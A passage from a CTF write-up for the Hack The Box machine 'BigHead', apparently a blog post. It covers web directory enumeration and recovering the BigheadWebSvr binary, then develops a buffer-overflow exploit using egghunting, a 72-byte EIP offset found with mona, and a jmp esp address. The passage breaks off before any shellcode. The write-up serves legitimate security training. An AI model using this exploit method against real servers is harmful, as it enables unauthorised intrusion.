&lt;h4 id=&quot;devbigheadhtb-shows-this-image-of-bighead-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;dev.bighead.htb&lt;/code&gt; shows this image of bighead :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;source-has-nothing-interesting-&quot;&gt;Source has nothing interesting :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-ran-gobuster-again-and-got-some-results-&quot;&gt;I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; again and got some results :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://dev.bighead.htb/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 2m0s
=====================================================
2019/04/24 20:55:05 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/blog (Status: 302)
/blog_ajax (Status: 302)
/blog_inlinemod (Status: 302)
/blog_usercp (Status: 302)
/blog_search (Status: 302)
/blog_report (Status: 302)
/blogger (Status: 302)
/blogindex (Status: 302)
/bloggers (Status: 302)
/blogs (Status: 302)
/blogspot (Status: 302)
/wp-content (Status: 302)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;but-all-these-pages-gave-this-result-&quot;&gt;But all these pages gave this result :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-intercepted-the-request-in-burp-to-figure-out-why-&quot;&gt;I intercepted the request in burp to figure out why :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/32.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-response-is-302-by-following-the-redirect-&quot;&gt;The response is &lt;code class=&quot;highlighter-rouge&quot;&gt;302&lt;/code&gt;, by following the redirect :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/34.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-responds-with-another-302&quot;&gt;It responds with another &lt;code class=&quot;highlighter-rouge&quot;&gt;302&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/35.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-it-will-keep-redirecting-us-in-a-loop-and-we-wont-get-anything&quot;&gt;So it will keep redirecting us in a loop and we won’t get anything.&lt;/h4&gt;
&lt;h4 id=&quot;at-this-point-i-didnt-know-what-to-do-because-all-of-my-attempts-have-hit-a-dead-end-i-did-a-sub-directory-bruteforce-again-with-wfuzz-instead-of-gobuster-and-i-got-one-more-result-&quot;&gt;At this point I didn’t know what to do because all of my attempts have hit a dead end. I did a sub directory bruteforce again with &lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz&lt;/code&gt; instead of &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; and I got one more result :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz --hc 404 -c -w /usr/share/wordlists/dirb/common.txt -u http://dev.bighead.htb/FUZZ&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/bighead/36.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-reason-why-gobuster-didnt-show-us-this-page-is-because-of-the-status-code-gobuster-only-showed-results-with-these-status-codes---status-codes--200204301302307403-while-wfuzz-showed-everything-except-404-responses---hc-404-coffee-gave-a-response-of-418-which-is-weird-i-looked-it-up-and-found-some-info-about-it-here-418-im-a-teapot--anyway-lets-take-a-look-&quot;&gt;The reason why &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; didn’t show us this page is because of the status code. &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; only showed results with these status codes : &lt;code class=&quot;highlighter-rouge&quot;&gt;[+] Status codes : 200,204,301,302,307,403&lt;/code&gt;, While &lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz&lt;/code&gt; showed everything except &lt;code class=&quot;highlighter-rouge&quot;&gt;404&lt;/code&gt; responses, &lt;code class=&quot;highlighter-rouge&quot;&gt;--hc 404&lt;/code&gt;. &lt;code class=&quot;highlighter-rouge&quot;&gt;/coffee&lt;/code&gt; gave a response of &lt;code class=&quot;highlighter-rouge&quot;&gt;418&lt;/code&gt; which is weird. I looked it up and found some info about it &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/418&quot;&gt;here&lt;/a&gt;. &lt;code class=&quot;highlighter-rouge&quot;&gt;418 I'm a teapot&lt;/code&gt; ! Anyway let’s take a look :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://dev.bighead.htb/coffee&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/bighead/37.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;its-showing-this-gif-&quot;&gt;It’s showing this &lt;code class=&quot;highlighter-rouge&quot;&gt;gif&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/teapot.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;which-is-saying--the-requested-entity-body-is-short-and-stout-tip-me-over-and-pour-me-out-&quot;&gt;Which is saying : “The requested entity body is short and stout. Tip me over and pour me out.” ?!&lt;/h4&gt;
&lt;h4 id=&quot;i-intercepted-the-request-with-burp-and-looked-at-the-response-&quot;&gt;I intercepted the request with burp and looked at the response :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/38.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/39.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-noticed-a-weird-server-name--bigheadwebsvr-10-i-looked-it-up-and-found-a-repository-on-the-machine-creators-github-3mrgnc3-&quot;&gt;I noticed a weird server name : &lt;code class=&quot;highlighter-rouge&quot;&gt;BigheadWebSvr 1.0&lt;/code&gt;. I looked it up and found a repository on the machine creator’s github (3mrgnc3) :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/40.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-searched-through-the-commits-and-got-this-one-which-seemed-to-be-the-right-one&quot;&gt;I searched through the commits and got &lt;a href=&quot;https://github.com/3mrgnc3/BigheadWebSvr/blob/b1b4d6ed5f2298bc243cd56cab77cd6fb4e48c3d/BHWS_Backup.zip&quot;&gt;this one&lt;/a&gt; which seemed to be the right one.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/41.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-asked-for-a-password-&quot;&gt;It asked for a password :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/42.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-tried-to-guess-it-and-after-some-attempts-bighead-worked-&quot;&gt;I tried to guess it and after some attempts &lt;code class=&quot;highlighter-rouge&quot;&gt;bighead&lt;/code&gt; worked :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/43.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/44.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/45.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;of-course-its-a-windows-executable-so-we-will-switch-to-a-windows-machine-at-this-point-the-hint-was-quite-obvious--the-requested-entity-body-is-short-and-stout-tip-me-over-and-pour-me-out-this-server-is-probably-vulnerable-to-a-buffer-overflow&quot;&gt;Of course it’s a windows executable so we will switch to a windows machine. At this point the hint was quite obvious : “The requested entity body is short and stout. Tip me over and pour me out.”, This server is probably vulnerable to a buffer overflow.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;buffer-overflow-in-bigheadwebsvr&quot;&gt;Buffer Overflow in &lt;code class=&quot;highlighter-rouge&quot;&gt;BigheadWebSvr&lt;/code&gt;&lt;/h3&gt;
&lt;h4 id=&quot;i-tried-to-run-the-server-but-it-complained-about-some-missing-dll-called-libmingwex-0dll-&quot;&gt;I tried to run the server but it complained about some missing &lt;code class=&quot;highlighter-rouge&quot;&gt;dll&lt;/code&gt; called &lt;code class=&quot;highlighter-rouge&quot;&gt;libmingwex-0.dll&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/46.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-i-installed-mingw-and-copied-the-dll-to-the-same-directory-as-the-server-&quot;&gt;So I installed &lt;a href=&quot;https://osdn.net/projects/mingw/releases/&quot;&gt;mingw&lt;/a&gt; and copied the &lt;code class=&quot;highlighter-rouge&quot;&gt;dll&lt;/code&gt; to the same directory as the server :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/47.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-i-had-to-allow-access-for-it-&quot;&gt;Then I had to allow access for it :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/48.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-the-server-is-running-&quot;&gt;Now the server is running :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/49.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;but-not-on-port-80-&quot;&gt;But not on port 80 :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/50.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-did-netstat--a--b-and-found-that-its-running-on-port-8008-&quot;&gt;I did &lt;code class=&quot;highlighter-rouge&quot;&gt;netstat -a -b&lt;/code&gt; and found that it’s running on port 8008 :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/51.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/52.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/53.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;great-i-intercepted-the-request-with-burp-then-i-ran-the-server-again-with-immunity-debugger-&quot;&gt;Great, I intercepted the request with burp then I ran the server again with &lt;a href=&quot;https://www.immunityinc.com/products/debugger/&quot;&gt;Immunity Debugger&lt;/a&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/54.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/55.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-we-need-to-know-how-to-make-the-server-crash-first-thing-i-wanted-to-try-was-sending-a-head-request-because-you-know--the-machine-name-is-bighead-d&quot;&gt;Now we need to know how to make the server crash. First thing I wanted to try was sending a HEAD request, because you know … the machine name is BigHead :D&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/56.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/57.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-yes-it-worked-the-eip-was-overwritten-with-a-i-tried-to-send-a-bigger-request-and-the-server-didnt-crash-and-that-was-a-bit-of-a-problem-because-we-are-limited-to-a-specific-size-so-we-dont-have-enough-space-to-store-our-shellcode-thats-why-we-will-use-egghunting-there-are-a-lot-of-great-tutorials-about-win32-egghunting-out-there-so-i-will-just-give-you-an-idea-of-what-is-egghunting-in-case-you-dont-know-when-we-dont-have-enough-space-on-the-stack-to-hold-the-shellcode-instead-of-sending-and-executing-the-shellcode-we-send-a-very-small-string-called-egghunter-when-that-egghunter-is-executed-it-searches-through-the-entire-memory-for-an-egg-when-it-hits-that-egg-it-executes-whats-after-it-the-shellcode-the-egg-is-a-4-bytes-string-say-for-example-r1ck-that-egg-is-doubled-and-added-before-the-shellcode-like-this--r1ckr1ck--shellcode-its-explained-very-well-in-skapes-paper-safely-searching-process-virtual-address-space-there-are-also-many-practical-tutorials-just-search-for-win32-egghunting&quot;&gt;And yes it worked. The EIP was overwritten with A. I tried to send a bigger request and the server didn’t crash, and that was a bit of a problem because we are limited to a specific size so we don’t have enough space to store our shellcode, That’s why we will use egghunting. There are a lot of great tutorials about win32 egghunting out there so I will just give you an idea of what is egghunting in case you don’t know. When we don’t have enough space on the stack to hold the shellcode, instead of sending and executing the shellcode we send a very small string called egghunter. When that egghunter is executed it searches through the entire memory for an egg. when it hits that egg it executes what’s after it (the shellcode). The egg is a 4-bytes string, say for example &lt;code class=&quot;highlighter-rouge&quot;&gt;R1ck&lt;/code&gt; that egg is doubled and added before the shellcode like this : &lt;code class=&quot;highlighter-rouge&quot;&gt;R1ckR1ck + shellcode&lt;/code&gt;. It’s explained very well in skape’s paper &lt;a href=&quot;http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf&quot;&gt;Safely Searching Process Virtual Address Space&lt;/a&gt;. There are also many practical tutorials just search for win32 egghunting.&lt;/h4&gt;
&lt;h4 id=&quot;now-back-to-the-vulnerable-server-first-thing-we-need-to-know-is-the-offset-im-using-mona-plugin-documentation&quot;&gt;Now back to the vulnerable server, first thing we need to know is the offset. I’m using &lt;a href=&quot;https://github.com/corelan/mona&quot;&gt;mona plugin&lt;/a&gt;. &lt;a href=&quot;https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/&quot;&gt;Documentation&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;mona-config--set-workingfolder-clogsp-to-make-mona-output-to-clogs&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;!mona config -set workingfolder c:\logs\%p&lt;/code&gt;, to make &lt;code class=&quot;highlighter-rouge&quot;&gt;mona&lt;/code&gt; output to &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\logs&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/58.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;to-find-the-offset-we-will-create-a-pattern-mona-pc-100-creates-a-pattern-of-100-chars-this-is-the-same-as-pattern_createrb-from-metasploit-i-used-it-in-my-buffer-overflow-write-ups&quot;&gt;To find the offset we will create a pattern &lt;code class=&quot;highlighter-rouge&quot;&gt;!mona pc 100&lt;/code&gt; (creates a pattern of 100 chars), this is the same as &lt;code class=&quot;highlighter-rouge&quot;&gt;pattern_create.rb&lt;/code&gt; from &lt;code class=&quot;highlighter-rouge&quot;&gt;metasploit&lt;/code&gt;. I used it in my &lt;a href=&quot;/categories/#binary-exploitation&quot;&gt;buffer overflow write-ups&lt;/a&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/59.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-will-put-the-output-in-a-file-called-patterntxt-in-clogs-&quot;&gt;It will put the output in a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;pattern.txt&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\logs&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/60.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;pattern--aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab9ac0ac1ac2ac3ac4ac5ac6ac7ac8ac9ad0ad1ad2a&quot;&gt;Pattern : &lt;code class=&quot;highlighter-rouge&quot;&gt;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/61.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;full-output-&quot;&gt;Full output :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;================================================================================
  Output generated by mona.py v2.0, rev 585 - Immunity Debugger
  Corelan Team - https://www.corelan.be
================================================================================
  Process being debugged : BigheadWebSvr (pid 1300)
  Current mona arguments: pc 100
================================================================================
  2019-04-24 22:43:44
================================================================================

Pattern of 100 bytes :
----------------------

ASCII:
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

HEX:
\x41\x61\x30\x41\x61\x31\x41\x61\x32\x41\x61\x33\x41\x61\x34\x41\x61\x35\x41\x61\x36\x41\x61\x37\x41\x61\x38\x41\x61\x39\x41\x62\x30\x41\x62\x31\x41\x62\x32\x41\x62\x33\x41\x62\x34\x41\x62\x35\x41\x62\x36\x41\x62\x37\x41\x62\x38\x41\x62\x39\x41\x63\x30\x41\x63\x31\x41\x63\x32\x41\x63\x33\x41\x63\x34\x41\x63\x35\x41\x63\x36\x41\x63\x37\x41\x63\x38\x41\x63\x39\x41\x64\x30\x41\x64\x31\x41\x64\x32\x41


JAVASCRIPT (unescape() friendly):
%u6141%u4130%u3161%u6141%u4132%u3361%u6141%u4134%u3561%u6141%u4136%u3761%u6141%u4138%u3961%u6241%u4130%u3162%u6241%u4132%u3362%u6241%u4134%u3562%u6241%u4136%u3762%u6241%u4138%u3962%u6341%u4130%u3163%u6341%u4132%u3363%u6341%u4134%u3563%u6341%u4136%u3763%u6341%u4138%u3963%u6441%u4130%u3164%u6441%u4132
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;lets-send-the-pattern-&quot;&gt;Let’s send the pattern :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/62.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/63.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-eip-was-overwritten-with-acc54aac-mona-findmsp-should-give-us-the-offset-but-for-some-reason-it-wasnt-able-to-find-it-so-i-did-it-manually-we-will-reverse-acc54aac-because-its-little-endian-so-it-will-be-ac4ac5ac-i-located-it-then-i-used-pythons-function-len-to-find-the-length-of-the-string-before-ac4ac5ac-&quot;&gt;the EIP was overwritten with &lt;code class=&quot;highlighter-rouge&quot;&gt;ACC54AAC&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;!mona findmsp&lt;/code&gt; should give us the offset but for some reason it wasn’t able to find it so I did it manually. We will reverse &lt;code class=&quot;highlighter-rouge&quot;&gt;ACC54AAC&lt;/code&gt; because it’s &lt;a href=&quot;http://chortle.ccsu.edu/assemblytutorial/Chapter-15/ass15_3.html&quot;&gt;little endian&lt;/a&gt;, so it will be &lt;code class=&quot;highlighter-rouge&quot;&gt;AC4AC5AC&lt;/code&gt;. I located it then I used python’s function &lt;code class=&quot;highlighter-rouge&quot;&gt;len()&lt;/code&gt; to find the length of the string before &lt;code class=&quot;highlighter-rouge&quot;&gt;AC4AC5AC&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/64.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/65.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;offset-is-72-lets-confirm-that-i-sent-72-as-then-8-bs-&quot;&gt;Offset is 72, let’s confirm that. I sent 72 A’s then 8 B’s :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/66.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-i-could-successfully-overwrite-eip-with-b-&quot;&gt;And I could successfully overwrite EIP with B :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/67.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;nice-we-control-eip-now-we-need-to-find-a-real-address-to-overwrite-eip-with-since-the-egghunter-will-be-located-on-the-stack-we-need-to-find-a-jmp-esp-instruction-to-make-it-jmp-to-the-egghunter-and-execute-it-to-do-this-we-will-use-mona-mona-jmp--r-esp-it-will-create-another-file-in-clogs-called-jmptxt-we-need-to-make-sure-that-the-address-we-choose-will-work-on-the-target-machine-so-i-used-one-of-the-addresses-from-the-dll-of-the-server-itself-bheadsvrdll-i-chose-the-first-one-&quot;&gt;Nice, We control EIP, Now we need to find a real address to overwrite EIP with. Since the egghunter will be located on the stack we need to find a &lt;code class=&quot;highlighter-rouge&quot;&gt;jmp esp&lt;/code&gt; instruction to make it jmp to the egghunter and execute it. To do this we will use mona. &lt;code class=&quot;highlighter-rouge&quot;&gt;!mona jmp -r ESP&lt;/code&gt;. It will create another file in &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\logs&lt;/code&gt; called &lt;code class=&quot;highlighter-rouge&quot;&gt;jmp.txt&lt;/code&gt;. We need to make sure that the address we choose will work on the target machine, So I used one of the addresses from the &lt;code class=&quot;highlighter-rouge&quot;&gt;dll&lt;/code&gt; of the server itself &lt;code class=&quot;highlighter-rouge&quot;&gt;bHeadSvr.dll&lt;/code&gt;. I chose the first one :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/68.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/69.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;full-output--1&quot;&gt;Full Output :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;================================================================================
  Output generated by mona.py v2.0, rev 585 - Immunity Debugger
  Corelan Team - https://www.corelan.be
================================================================================
  Process being debugged : BigheadWebSvr (pid 5532)
  Current mona arguments: jmp -r ESP
================================================================================
  2019-04-25 02:15:27
================================================================================
-----------------------------------------------------------------------------------------------------------------------------------------
 Module info :
-----------------------------------------------------------------------------------------------------------------------------------------
 Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename &amp;amp; Path
-----------------------------------------------------------------------------------------------------------------------------------------
 0x74c70000 | 0x74e61000 | 0x001f1000 | True   | True    | True  |  False   | True   | 10.0.17763.1 [KERNELBASE.dll] (C:\Windows\System32\KERNELBASE.dll)
 0x771f0000 | 0x77269000 | 0x00079000 | True   | True    | True  |  False   | True   | 10.0.17763.1 [sechost.dll] (C:\Windows\System32\sechost.dll)
 0x00400000 | 0x00413000 | 0x00013000 | False  | False   | False |  False   | False  | -1.0- [BigheadWebSvr.exe] (C:\bighead\BHWS_Backup\BigheadWebSvr.exe)
 0x62500000 | 0x62510000 | 0x00010000 | False  | False   | False |  False   | False  | -1.0- [bHeadSvr.dll] (C:\bighead\BHWS_Backup\bHeadSvr.dll)
 0x75510000 | 0x755a8000 | 0x00098000 | True   | True    | True  |  False   | True   | 10.0.17763.1 [KERNEL32.DLL] (C:\Windows\System32\KERNEL32.DLL)
 0x74ef0000 | 0x74fb0000 | 0x000c0000 | True   | True    | True  |  False   | True   | 7.0.17763.1 [msvcrt.dll] (C:\Windows\System32\msvcrt.dll)
 0x64540000 | 0x64570000 | 0x00030000 | False  | False   | False |  False   | False  | -1.0- [libmingwex-0.dll] (C:\bighead\BHWS_Backup\libmingwex-0.dll)
 0x75270000 | 0x752ee000 | 0x0007e000 | True   | True    | True  |  False   | True   | 10.0.17763.1 [ADVAPI32.DLL] (C:\Windows\System32\ADVAPI32.DLL)
 0x776b0000 | 0x77847000 | 0x00197000 | True   | True    | True  |  False   | True   | 10.0.17763.1 [ntdll.dll] (C:\Windows\SYSTEM32\ntdll.dll)
 0x77410000 | 0x774cf000 | 0x000bf000 | True   | True    | True  |  False   | True   | 10.0.17763.1 [RPCRT4.dll] (C:\Windows\System32\RPCRT4.dll)
 0x75370000 | 0x753cf000 | 0x0005f000 | True   | True    | True  |  False   | True   | 10.0.17763.1 [WS2_32.dll] (C:\Windows\System32\WS2_32.dll)
-----------------------------------------------------------------------------------------------------------------------------------------
0x625012f0 : jmp esp |  {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\bighead\BHWS_Backup\bHeadSvr.dll)
0x625012fd : jmp esp |  {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\bighead\BHWS_Backup\bHeadSvr.dll)
0x6250130a : jmp esp | ascii {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\bighead\BHWS_Backup\bHeadSvr.dll)
0x62501317 : jmp esp | ascii {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\bighead\BHWS_Backup\bHeadSvr.dll)
0x62501324 : jmp esp | ascii {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\bighead\BHWS_Backup\bHeadSvr.dll)
0x62501331 : jmp esp | ascii {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\bighead\BHWS_Backup\bHeadSvr.dll)
0x6250133e : jmp esp | ascii {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\bighead\BHWS_Backup\bHeadSvr.dll)
0x6250134b : jmp esp | ascii {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\bighead\BHWS_Backup\bHeadSvr.dll)
0x6250134d : jmp esp | ascii {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\bighead\BHWS_Backup\bHeadSvr.dll)
0x6455b1ca : push esp # ret  |  {PAGE_EXECUTE_READ} [libmingwex-0.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\bighead\BHWS_Backup\libmingwex-0.dll)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;lets-send-a-request-to-test-it-72-as-then-f0125062-which-is-625012f0-reversed&quot;&gt;Let’s send a request to test it, 72 A’s then &lt;code class=&quot;highlighter-rouge&quot;&gt;f0125062&lt;/code&gt; which is &lt;code class=&quot;highlighter-rouge&quot;&gt;625012f0&lt;/code&gt; reversed:&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/70.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/71.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;its-working-fine-last-thing-we-need-to-know-is-how-to-send-the-shellcode-i-sent-a-post-request-to-see-how-the-server-handles-it-just-a-bunch-of-as-&quot;&gt;It’s working fine. Last thing we need to know is how to send the shellcode. I sent a POST request to see how the server handles it, just a bunch of A’s :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/72.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
